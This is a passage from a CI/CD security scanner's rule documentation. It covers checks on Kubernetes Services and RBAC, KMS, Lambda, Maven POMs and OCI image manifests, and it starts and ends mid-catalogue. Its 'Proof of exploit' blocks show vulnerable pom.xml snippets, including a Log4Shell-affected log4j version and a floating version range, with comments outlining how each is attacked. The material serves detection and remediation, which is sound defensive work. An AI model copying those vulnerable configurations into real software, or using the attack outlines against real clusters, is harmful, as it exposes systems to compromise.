**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** CVE-2020-8554 is a design-level Kubernetes weakness rather than a code bug: any namespace user with ``services`` create permission can declare ``spec.externalIPs: [<arbitrary IP>]`` on a Service, and kube-proxy installs DNAT rules that intercept traffic destined for that IP on every node. The attacker primitive is to MITM in-cluster traffic to public endpoints, metadata services, or other tenants' workloads. Kubernetes upstream's remediation is admission-time enforcement (see the ``DenyServiceExternalIPs`` admission plugin and the RBAC pattern in the official guidance) rather than a runtime fix. This rule flags any non-empty ``externalIPs`` list so the team can confirm the field is gone from manifests before the admission policy is rolled out.

**Recommendation.** Remove ``spec.externalIPs`` from the Service. The field has no legitimate use in most clusters and any namespace user with ``services.create`` can claim any IP, including the cluster's own kube-apiserver, metrics-server, or an external service IP, and the kube-proxy iptables rules will redirect matching traffic to their pods. Enforce the absence cluster-wide with an admission policy (Gatekeeper / Kyverno / ValidatingAdmissionPolicy) that rejects Services with a non-empty ``externalIPs`` list.

**Seen in the wild.**

- CVE-2020-8554 (Kubernetes, 2020): documented MITM-via-externalIPs design flaw. Kubernetes' upstream advisory recommends restricting externalIPs via admission control.

**Source:** [`K8S-041`](../providers/kubernetes.md#k8s-041) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-042`: RoleBinding grants access to system:anonymous / system:unauthenticated <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-042 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Kubernetes resolves authentication failures into the ``system:anonymous`` user (member of ``system:unauthenticated`` group) rather than rejecting the request outright, so any RBAC subject naming either of those values applies to requests with no Authorization header. The rule fires on both ``RoleBinding`` (namespace-scoped) and ``ClusterRoleBinding`` (cluster-scoped) subjects. Pairs with K8S-020: cluster-admin bound to a named SA is bad; cluster-admin bound to ``system:anonymous`` is cluster takeover by anyone with TCP/443 to the apiserver.

**Recommendation.** Remove the binding's subject entry for ``system:anonymous`` or ``system:unauthenticated``. Anything bound to either subject is reachable without an authentication token, anyone who can hit the apiserver, including from inside an untrusted pod or from the public internet on an exposed apiserver, gets the bound verbs. If the workload genuinely needs unauthenticated read access (rare, usually only for OIDC discovery or the deprecated ``system:public-info-viewer`` shape), audit the bound ClusterRole's verbs+resources and confirm no write or secret-read verb is included.

**Source:** [`K8S-042`](../providers/kubernetes.md#k8s-042) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-043`: Ingress rule has wildcard or missing host (catch-all) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-043 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** An Ingress rule with no ``host:`` matches every Host header the controller receives; a rule with ``host: '*'`` is the explicit form of the same behavior. Both shape choices collapse the controller's hostname-based routing into a pure path-based match, which means anyone who can present any hostname (HTTP/1.1 Host header rewrite, malicious CNAME, controller hairpin) reaches this backend. The rule also fires on apex wildcards like ``host: '*.example.com'`` since they accept subdomains the cluster operator never intended to register. A backend that's intentionally wildcard-routed (a tenant-per-subdomain SaaS) should suppress with a rationale rather than disabling the check.

**Recommendation.** Pin every Ingress rule to an explicit hostname. ``host: api.example.com`` (not ``host: '*'``, ``host: '*.example.com'``, and not an omitted ``host:``). A catch-all host binding means any request to the ingress controller's external address, regardless of HTTP Host header, can route to this backend; an attacker with control over an arbitrary hostname pointing at the same controller (a parked domain, a typo'd CNAME, a cluster-internal name on a shared controller) reaches paths that should have been host-scoped.

**Known false positives.**

- TLS terminators that intentionally use a single Ingress with a wildcard host to front many tenant subdomains are legitimate; suppress the finding for that Ingress specifically rather than disabling the rule.

**Source:** [`K8S-043`](../providers/kubernetes.md#k8s-043) in the [Kubernetes provider](../providers/kubernetes.md).

### `KMS-000`: KMS API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-kms-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`KMS-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `KMS-001`: KMS customer-managed key has rotation disabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-kms-001 }

**Evidences:** [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** Annual rotation regenerates the underlying key material for the same CMK ARN. Existing ciphertexts can still be decrypted (KMS keeps old material around), but new encrypts use the new material, so a cryptographic exposure (side-channel, an accidental export, an old compromised offline backup) only protects ciphertexts from before the rotation.

**Recommendation.** Enable annual rotation on every customer-managed KMS key used for CI/CD artifact, log, and secret encryption. Unrotated CMKs keep the same key material indefinitely, so a single cryptographic exposure (side-channel, accidental export) is permanent.

**Source:** [`KMS-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `KMS-002`: KMS key policy grants wildcard KMS actions <span class="pg-sev pg-sev--high">HIGH</span> { #detail-kms-002 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** ``kms:*`` on a key policy is administrative authority over the cipher boundary: ``CancelKeyDeletion``, ``ScheduleKeyDeletion``, ``ReEncrypt``, ``UpdateKeyDescription``, and the data-plane decrypt actions all collapse into one grant. A CI/CD principal almost never needs more than the data-plane subset (``Decrypt`` / ``GenerateDataKey`` / ``Encrypt``).

**Recommendation.** Replace ``kms:*`` grants with specific actions needed by the caller (e.g. ``kms:Decrypt``, ``kms:GenerateDataKey``). Key-policy wildcard grants let any holder of the principal re-key, schedule deletion, or export material at will.

**Source:** [`KMS-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `LMB-000`: Lambda API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-lmb-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`LMB-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `LMB-001`: Lambda function has no code-signing config <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-001 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Lambda code-signing config + a Signer profile (SIGN-001) validates that an uploaded zip was signed by a known profile before it's allowed to run. Without one, anyone who reaches ``lambda:UpdateFunctionCode``, a CI/CD role compromise, a misattached IAM policy, can replace the function's code with no chain-of-custody check.

**Recommendation.** Create an AWS Signer profile, reference it from an ``aws_lambda_code_signing_config`` with ``untrusted_artifact_on_deployment = Enforce`` and attach that config to the function. Without one, the Lambda runtime will execute any code that a principal with lambda:UpdateFunctionCode uploads.

**Source:** [`LMB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `LMB-002`: Lambda function URL has AuthType=NONE <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-002 }

**Evidences:** [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** A Lambda function URL with ``AuthType=NONE`` is a public HTTPS endpoint. Anyone who knows the URL can invoke. This is sometimes deliberate (a webhook receiver) but the deliberate version typically signs / validates inside the function, the rule fires regardless because the IAM-side control isn't there.

**Recommendation.** Set the function URL ``auth_type`` to ``AWS_IAM`` and grant ``lambda:InvokeFunctionUrl`` through IAM. ``NONE`` exposes the function to the public internet without authentication.

**Source:** [`LMB-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `LMB-003`: Lambda function env vars may contain plaintext secrets <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-003 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Lambda env vars are world-readable to any principal with ``lambda:GetFunctionConfiguration``, much wider than the principal that can invoke the function. They also persist in CloudFormation drift, change-sets, and CloudTrail events. A secret in a Lambda env var is essentially exposed to anyone with read access to the account.

**Recommendation.** Move secrets out of Lambda environment variables and into Secrets Manager or SSM Parameter Store. Environment variables are visible to anyone with ``lambda:GetFunctionConfiguration`` and persist in CloudTrail events, which keeps the secret in audit logs.

**Source:** [`LMB-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `LMB-004`: Lambda resource policy allows wildcard principal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-lmb-004 }

**Evidences:** [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** A wildcard-principal Allow on a Lambda function resource policy lets anyone invoke. The legitimate case is a service principal (API Gateway, S3 events) where AWS fills in the SourceArn/SourceAccount at invoke time, without those conditions, any account using that service can invoke.

**Recommendation.** Remove Allow statements with ``Principal: '*'`` from every Lambda function resource policy, or scope them with a ``SourceArn`` / ``SourceAccount`` condition. Service principals (e.g. ``apigateway.amazonaws.com``) are the common legitimate case, ensure they carry a condition.

**Source:** [`LMB-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `MVN-001`: pom.xml dependency uses a floating version range <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-001 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Fires on any ``<version>`` value that matches the Maven range grammar: bracket-or-paren-delimited intervals (``[1.0,2.0)``, ``(,3.0]``), open ranges (``[1.0,)``), or the legacy floating tokens ``LATEST`` / ``RELEASE``. Property references (``${spring.version}``) are resolved against the POM's ``<properties>`` block before the check runs, so a property pointing at a range still fires.

Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (that's MVN-004's surface) because the version-management section's purpose is to centralize version literals, not consume them at install time.

**Recommendation.** Replace Maven version ranges (``[1.0,2.0)``, ``[1.0,)``, ``LATEST``, ``RELEASE``) with an exact version pin (``<version>1.2.3</version>``). The range form lets Maven pick any later release that fits, so a compromised patch version reaches the build without a code change. Pair the exact-pin manifest with a verified-by-checksum or verified-by-signature repository policy (MVN-005) so a tampered jar at the same version literal still fails.

**Known false positives.**

- Multi-module reactor builds sometimes legitimately use ``${project.version}`` (the reactor's own version) which resolves to a plain string from the parent POM. The rule honors property substitution so this passes; if it does fire on a deliberate range (e.g. a build-time tool pulled via a range you control), suppress with a one-line rationale.

**Seen in the wild.**

- Codecov Bash Uploader compromise (April 2021): downstream builds pulling Codecov via mutable references shipped the tampered uploader for two months. The Maven-side analog is any range-pinned ``codecov`` / scanner / agent jar; same exposure window. https://about.codecov.io/security-update/

**Proof of exploit.**

```
<!-- Vulnerable: range admits a future patch version. -->
<dependency>
  <groupId>org.example</groupId>
  <artifactId>util</artifactId>
  <version>[1.0,2.0)</version>
</dependency>

<!-- Attack: the maintainer's account is hijacked and a
     malicious 1.7.99 is published. Next ``mvn install``
     resolves the range and pulls the poisoned jar without
     any pom.xml change. -->

<!-- Safe: exact pin. A swap at the same coordinate breaks
     the checksum/signature gate (MVN-005). -->
<dependency>
  <groupId>org.example</groupId>
  <artifactId>util</artifactId>
  <version>1.7.0</version>
</dependency>
```

**Source:** [`MVN-001`](../providers/maven.md#mvn-001) in the [maven provider](../providers/maven.md).

### `MVN-002`: pom.xml depends on a mutable SNAPSHOT version <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-002 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Fires on any non-managed ``<version>`` ending in ``-SNAPSHOT`` (case-insensitive). Property references are resolved against the POM's ``<properties>`` first, so a property whose value ends in ``-SNAPSHOT`` still trips the rule. ``<dependencyManagement>`` entries are exempt; centralized version literals are MVN-004's surface.

**Recommendation.** Replace ``-SNAPSHOT`` versions with a released, immutable version (``1.2.3``, not ``1.2.3-SNAPSHOT``). Maven treats SNAPSHOT artifacts as mutable: the repository can re-deploy the same coordinate, and ``mvn install`` will pull whatever is current at resolution time. Snapshot dependencies belong to the development inner loop; gate them out of release builds and CI build pipelines.

**Known false positives.**

- Multi-module reactor builds where every sibling references ``${project.version}-SNAPSHOT`` during local development. Suppress in your local profile or scope the scan to the release POM; gating release builds on SNAPSHOT-free deps is exactly what this rule is for.

**Source:** [`MVN-002`](../providers/maven.md#mvn-002) in the [maven provider](../providers/maven.md).

### `MVN-003`: pom.xml declares a plaintext-HTTP Maven repository <span class="pg-sev pg-sev--high">HIGH</span> { #detail-mvn-003 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Fires on any ``<repository>``, ``<pluginRepository>``, or ``<distributionManagement>`` URL using the ``http://`` scheme. ``file://`` and ``https://`` are exempt. The rule evaluates both project POMs and per-user / per-CI ``settings.xml`` mirror entries via the orchestrator.

**Recommendation.** Change every ``<repository><url>`` to ``https://`` and delete any ``<repository>`` whose host doesn't expose TLS. Plaintext-HTTP repositories let a network attacker swap downloaded jars in flight (the canonical Maven supply-chain MITM attack); ``https://`` plus the repository's published checksums (MVN-005) is the minimum baseline.

**Known false positives.**

- Internal Maven repositories on a fully-isolated build network sometimes legitimately serve over HTTP. If you can actually attest that the network path is end-to-end untamperable (a single-tenant air-gapped subnet), suppress with a rationale naming that boundary.

**Seen in the wild.**

- Maven Central enforced HTTPS-only for the central repository in January 2020; the legacy ``http://repo1.maven.org`` endpoint was retired specifically because of MITM-tampering attacks against downstream consumers. https://blog.sonatype.com/central-repository-moving-to-https

**Source:** [`MVN-003`](../providers/maven.md#mvn-003) in the [maven provider](../providers/maven.md).

### `MVN-004`: pom.xml dependency omits an explicit ``<version>`` <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-004 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Fires on any non-managed ``<dependency>`` whose ``<version>`` element is absent or empty. Managed entries in ``<dependencyManagement>`` are the *source* of the version and intentionally out of scope for the entire Maven rule pack (MVN-001 / MVN-002 / MVN-004 all iterate ``iter_real_dependencies(...)``, which skips managed entries) — a BOM-style version-management block is its own surface and is audited via the inherited POM.

**Recommendation.** Every ``<dependency>`` must carry a ``<version>``, either inline or via a ``<dependencyManagement>`` block in this POM or a parent. Implicit-version dependencies inherit whatever Maven resolves at build time (often the highest available release), so a maintainer push to a higher version reaches the build unobserved. If the version is genuinely managed by a parent POM, declare it in this POM's ``<dependencyManagement>`` so the resolved version is at least pinned at the project level.

**Known false positives.**

- Spring Boot starters and other BOM-managed dependencies intentionally omit ``<version>`` so the imported BOM decides. The rule still fires because the BOM is not visible at static-analysis time; suppress with a rationale naming the BOM POM, or import the BOM explicitly into this project's ``<dependencyManagement>``.

**Source:** [`MVN-004`](../providers/maven.md#mvn-004) in the [maven provider](../providers/maven.md).

### `MVN-005`: Maven repository accepts artifacts without strict checksum gating <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-005 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Fires when any ``<repository>`` / ``<pluginRepository>`` declares ``<checksumPolicy>warn</checksumPolicy>`` or ``<checksumPolicy>ignore</checksumPolicy>`` (explicitly weakened from the default), or when the policy is absent AND the URL is not Maven Central (Central enforces checksums server-side, so the policy is moot for that single repo). Internal mirrors and third-party repositories are the canonical place this rule fires.

**Recommendation.** On every ``<repository>``, set ``<checksumPolicy>fail</checksumPolicy>`` under both ``<releases>`` and ``<snapshots>``. Maven's default policy is ``warn``: a checksum mismatch logs a line and the build continues with the tampered artifact. ``fail`` halts on any mismatch, which is the only setting that actually gates the build on checksum integrity. For Maven 3.9.x and newer, prefer the global ``-C`` / ``-c`` invocation flag in CI plus per-repo ``fail`` so a missing checksumPolicy doesn't downgrade to warn at runtime.

**Known false positives.**

- Internal artifact repositories with server-side checksum verification (a Nexus / Artifactory deployment configured to reject mismatched uploads) functionally meet the control even with ``warn`` at the client. The rule cannot see the server-side policy; suppress with a rationale naming the platform / version that enforces it.

**Source:** [`MVN-005`](../providers/maven.md#mvn-005) in the [maven provider](../providers/maven.md).

### `MVN-006`: pom.xml pins a known-compromised Maven Central artifact version <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-mvn-006 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Walks every non-managed dependency against the curated compromised-package registry in ``pipeline_check.core.checks.maven._compromised_packages``. Group/artifact matching is case-insensitive; version matching is exact (with optional regex fallback for advisories that span a range). Property references are resolved against the POM's ``<properties>`` block so ``${log4j.version}`` is checked against its resolved value. ``<dependencyManagement>`` entries are skipped to avoid double-counting when the same coordinate is both managed and consumed.

**Recommendation.** Bump the affected dependency to a post-incident clean version announced in the citing advisory. For Log4Shell and Spring4Shell class CVEs, rotate any secret reachable to production processes during the exposure window (most Maven-side advisories enable unauthenticated RCE on the deployed app, so any in-process credential should be considered exposed). Pair with MVN-005 (strict checksum policy) so future bytes published at the same coordinate are rejected, and with a vuln-scanning step (Snyk, Dependency-Check) for breadth beyond the curated registry.

**Known false positives.**

- The registry covers only public, advisory-confirmed compromises and a small set of canonical CVE-mapped vulnerable versions (Log4Shell, Spring4Shell, Text4Shell). For broader CVE coverage, run a dependency-vulnerability scanner (OWASP Dependency-Check, Snyk, Trivy) alongside pipeline-check; MVN-006 is the curated supply-chain anchor.

**Seen in the wild.**

- Log4Shell, CVE-2021-44228 (December 2021): the canonical Maven-side ecosystem-wide RCE. Mass exploitation began within hours of public disclosure. https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- Spring4Shell, CVE-2022-22965 (March 2022): RCE via the spring-beans data-binding path on JDK 9+ WAR deployments. https://nvd.nist.gov/vuln/detail/CVE-2022-22965

**Proof of exploit.**

```
<!-- Vulnerable: pinned to a Log4Shell-affected version. -->
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-core</artifactId>
  <version>2.14.1</version>
</dependency>

<!-- Attack: any log line that interpolates an attacker-
     controlled string (User-Agent, search field) triggers
     a JNDI lookup, which fetches and executes attacker-
     served bytecode. One curl is enough to RCE. -->

<!-- Safe: post-incident clean version. 2.17.1 disables
     the JNDI lookup substitution entirely. -->
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-core</artifactId>
  <version>2.17.1</version>
</dependency>
```

**Source:** [`MVN-006`](../providers/maven.md#mvn-006) in the [maven provider](../providers/maven.md).

### `MVN-007`: settings.xml mirror routes external traffic through one repo <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-007 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Fires on any ``<mirror>`` in a ``settings.xml`` whose ``<mirrorOf>`` value is ``*`` or ``external:*`` (the two patterns that capture arbitrary external traffic). Repository-specific patterns (``central``, ``!internal-only,*``) and explicit allowlists are exempt. Project POMs that don't carry a ``<mirrors>`` block silently pass.

**Recommendation.** Replace ``<mirrorOf>*</mirrorOf>`` and ``<mirrorOf>external:*</mirrorOf>`` with a narrowly-scoped list naming the upstream repositories you actually want to redirect (``central``, ``central,jcenter``). A wildcard mirror routes every dependency, including ones declared by transitive POMs the build hasn't approved, through the mirror operator: a single compromise of that mirror compromises every artifact the build resolves. Pin the mirror URL to ``https://`` and audit the mirror operator's publishing controls.

**Known false positives.**

- Single-team artifact-proxy patterns (one Nexus / Artifactory acting as the universal upstream front) legitimately use ``<mirrorOf>*</mirrorOf>`` and rely on the proxy's own access controls. If the proxy is a controlled artifact-allowlist target rather than a passthrough, suppress with a rationale naming the proxy endpoint and the allowlist that gates it.

**Source:** [`MVN-007`](../providers/maven.md#mvn-007) in the [maven provider](../providers/maven.md).

### `OCI-001`: Image manifest is missing OCI provenance annotations <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-oci-001 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Without these two annotations a pulled image can't be traced back to a source revision, so an incident-response team has no way to reach the build that produced it. The rule fires on whichever layer the manifest carries (top-level for an index, sub-manifest for a per-platform image); DF-016 catches the same gap at Dockerfile authoring time, OCI-001 catches it once the image has been built and any later ``docker buildx --annotation`` overrides have already been applied.

**Recommendation.** Stamp the image with at least ``org.opencontainers.image.source`` (the URL of the source repo) and ``org.opencontainers.image.revision`` (the commit SHA built into the image). With ``docker buildx`` this is ``--label org.opencontainers.image.source=...`` plus ``--label org.opencontainers.image.revision=...`` at build time, or set them as image annotations through ``--annotation`` so they appear on the manifest itself (``manifest.annotations`` is what registries surface to ``manifest inspect``).

**Known false positives.**

- Throwaway / scratch images that never leave a developer's machine (e.g. ``image inspect`` of an intermediate build stage) don't need provenance annotations. Suppress via ignore-file rather than removing the rule.

**Source:** [`OCI-001`](../providers/oci.md#oci-001) in the [OCI manifest provider](../providers/oci.md).

### `OCI-002`: Image is missing a build attestation manifest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-002 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release, [`ESF-S-PROVENANCE`](#ctrl-esf-s-provenance) Generate and verify provenance metadata (SLSA / in-toto) for produced artifacts.

**How this is detected.** Build attestations are the canonical place for SLSA provenance and SBOM data on an OCI image. A multi-platform image index that ships per-architecture manifests but no attestation-manifest sibling means there's no signed record of how the image was built or what's inside it, so consumers can't enforce SLSA Build-L2+ or feed an SBOM into vulnerability triage. A single-platform manifest (no image index) also fails this rule, attestations require the index-of-manifests shape that BuildKit produces by default.

**Recommendation.** Build the image with ``docker buildx build --attest=type=provenance,mode=max --attest=type=sbom`` (or the equivalent BuildKit frontend flags). Both attestations land as sibling sub-manifests inside the image index, annotated with ``vnd.docker.reference.type: attestation-manifest`` and linked to their target manifest via ``vnd.docker.reference.digest``. Verify after pushing with ``docker buildx imagetools inspect <ref>``, the ``Attestations`` section should list both predicate types.

**Known false positives.**

- Intermediate / cache-only images pushed by CI for later-stage consumption may legitimately ship without attestations to keep build artifacts small. Suppress via ignore-file when this is the deliberate shape, the default expectation for any image that reaches a production registry is a full attestation set.
- Some registries strip the attestation sub-manifests on pull (``docker pull`` of a single platform unwraps the index). If the JSON you're scanning came from ``docker manifest inspect`` rather than ``docker buildx imagetools inspect --raw``, attestations may be invisible even when present upstream.

**Source:** [`OCI-002`](../providers/oci.md#oci-002) in the [OCI manifest provider](../providers/oci.md).

### `OCI-003`: Image manifest is missing the ``image.created`` annotation <span class="pg-sev pg-sev--low">LOW</span> { #detail-oci-003 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Image age isn't a security boundary on its own, but a missing ``image.created`` annotation makes routine triage questions ("is this image stale enough to warrant a rebuild?", "was this image built before or after the CVE-2024-XXXX advisory?") much harder to answer automatically. Surfacing the gap as LOW-severity catches the omission early without overwhelming reports for an otherwise-well-formed image.

**Recommendation.** Stamp ``org.opencontainers.image.created`` with the build timestamp (RFC 3339 / ISO 8601, e.g. ``2025-01-30T18:00:00Z``). With ``docker buildx`` either pass ``--label org.opencontainers.image.created=$(date -u +%Y-%m-%dT%H:%M:%SZ)`` at build time, or rely on the BuildKit frontend default which does it automatically when ``SOURCE_DATE_EPOCH`` is unset. The annotation lets downstream vuln scanners and registries surface image age, which is the lightest-weight CVE-triage signal available without pulling the config blob.

**Known false positives.**

- Reproducible-build pipelines deliberately omit ``image.created`` (or pin it to ``SOURCE_DATE_EPOCH``) so the same source produces a byte-identical image. Suppress via ignore-file when reproducibility is the goal.

**Source:** [`OCI-003`](../providers/oci.md#oci-003) in the [OCI manifest provider](../providers/oci.md).

### `OCI-004`: Image layer references an arbitrary URL (foreign layer) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-004 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** A layer with a ``urls:`` field is fetched from whatever URL the manifest declares, not from the registry the image was pulled from. The digest is still verified after the fetch, so a passive attacker can't substitute a different blob, but an attacker who controls the URL endpoint can serve different content depending on the client (server-side cloaking) or simply take the endpoint offline to break image pulls. The rule fires on any layer whose descriptor includes a non-empty ``urls:`` array; it doesn't try to validate URL hygiene (HTTPS, allow-list of hosts) since the existence of the field alone is the policy violation.

**Recommendation.** Rebuild the image without foreign-layer references. The OCI / Docker spec lets a layer descriptor carry a ``urls:`` field that tells the client to pull the layer blob from an arbitrary HTTP location at image-pull time, bypassing the registry's content-addressed store. The mechanism exists for proprietary base layers (notably Windows Server base images that ship from ``mcr.microsoft.com``) but is increasingly deprecated, modern Windows images at ``mcr.microsoft.com/windows/servercore:ltsc2022`` no longer use it. If the foreign URL is genuinely required, host the blob inside your own registry and pin it by digest the same as any other layer.

**Known false positives.**

- Legacy Windows Server base images (pre-Windows 11 / Server 2022) ship layers from ``mcr.microsoft.com`` with this mechanism. Suppress via ignore-file when the Windows image is intentional, the rule has no way to distinguish a Microsoft-blessed URL from any other.

**Source:** [`OCI-004`](../providers/oci.md#oci-004) in the [OCI manifest provider](../providers/oci.md).

### `OCI-005`: Image manifest is missing the ``image.licenses`` annotation <span class="pg-sev pg-sev--low">LOW</span> { #detail-oci-005 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Without ``image.licenses`` an SBOM tool either has to fall back to scanning the layer contents (slow, best-effort) or simply mark the image as ``license: unknown`` in compliance reports. The same field is what container registries surface to the operator UI, so its absence also makes manual license review harder. The rule is LOW severity because a missing license is a hygiene gap rather than a security boundary, but it ratchets up SBOM quality enough that it's worth catching at scan time.

**Recommendation.** Stamp ``org.opencontainers.image.licenses`` with the SPDX expression for the image's contents (e.g. ``Apache-2.0``, ``MIT AND Apache-2.0``, ``Apache-2.0 WITH LLVM-exception``). With ``docker buildx`` the simplest path is to add ``--label org.opencontainers.image.licenses=Apache-2.0`` (or, for annotation-based propagation onto the manifest, ``--annotation manifest:org.opencontainers.image.licenses=Apache-2.0``). The OCI image-spec annotation is a well-known SPDX expression carrier, downstream SBOM generators and registry UIs read it directly without needing per-tool configuration.

**Known false positives.**

- Internal images that never leave a private registry and aren't subject to OSS license compliance audits may legitimately omit the annotation. Suppress via ignore-file when this is the deliberate stance.
- Multi-license images with ambiguous coverage (e.g. a base image plus mixed-license app code) sometimes skip the annotation rather than emit a misleading single-license value. In that case, the correct fix is to emit the SPDX compound expression (``MIT AND Apache-2.0``); suppression is the wrong answer.

**Source:** [`OCI-005`](../providers/oci.md#oci-005) in the [OCI manifest provider](../providers/oci.md).

### `OCI-006`: Image has an excessive layer count <span class="pg-sev pg-sev--low">LOW</span> { #detail-oci-006 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Each layer is a content-addressed blob with its own registry round-trip on pull, its own caching decision, and its own potential for credential leakage (a ``RUN`` step that touched a secret leaves the secret in that layer's tar archive even if a later layer deletes it). The rule fires above 40 layers, which empirically captures the ``docker history`` blowout that happens when a Dockerfile's ``RUN`` lines don't collapse (``RUN apt-get update`` followed by ``RUN apt-get install`` followed by ``RUN apt-get clean`` is three layers where one would do). Indexes don't have layers of their own, the rule passes on them and applies instead to each per-platform image manifest a downstream scan loads.

**Recommendation.** Squash the image's layer count by collapsing adjacent ``RUN`` directives in the Dockerfile (``RUN apt-get update && apt-get install ... && rm -rf /var/lib/apt/lists/*`` is the canonical pattern), ordering ``COPY`` lines so cache invalidation moves them as a unit, and using multi-stage builds to drop build-time-only artifacts before the final ``FROM``. BuildKit's ``--squash`` flag flattens the result if the Dockerfile shape can't be restructured. Most well-tuned production images sit between 5 and 20 layers; anything past 40 is almost always accidental Dockerfile sprawl, not intentional layering.

**Known false positives.**

- Some legitimately large base images (CUDA / ML toolchains, fully-built distros) ship with 30-50 layers by design. Suppress via ignore-file when the layer count reflects a deliberate base-image choice rather than Dockerfile RUN-step sprawl.

**Source:** [`OCI-006`](../providers/oci.md#oci-006) in the [OCI manifest provider](../providers/oci.md).

### `OCI-007`: Image manifest uses legacy schemaVersion 1 (no content addressing) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-007 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) Enforce artifact / tag immutability to preserve provenance.

